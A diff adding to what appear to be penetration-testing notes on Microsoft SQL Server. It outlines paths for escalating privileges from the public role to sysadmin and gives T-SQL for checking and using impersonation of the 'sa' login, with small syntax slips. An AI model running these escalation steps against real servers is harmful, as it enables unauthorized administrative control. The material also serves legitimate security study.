@@ -128,6 +128,26 @@ j) database links
 k) UNC Path Injection
 l) Python code execution
 
+To escalate from the public role to sysadmin we will work with these 3:
+a) Impersonate Privileges
+b) Stored Procedure and Trigger Creation/Injection Issues
+c) Automatic Execution of Stored Procedures
+
+a) There is a permission in SQL which allows a less privileged user to impersonate a user with more access. The commands to be executed are limitless. The requirement though, is for the database to be configured
+as trustworthy.
+
+To check if you can impersonate the 'sa' login, try:
+###
+SELECT SYSTEM USER
+SELECT IS_SRVROLEMEMBER('SYSADMIN')
+#execute at server level
+EXECUTE AS LOGIN = 'sa'
+#execute as user
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('SYSADMIN')
+
+####
+... to be continued....
 
 
 
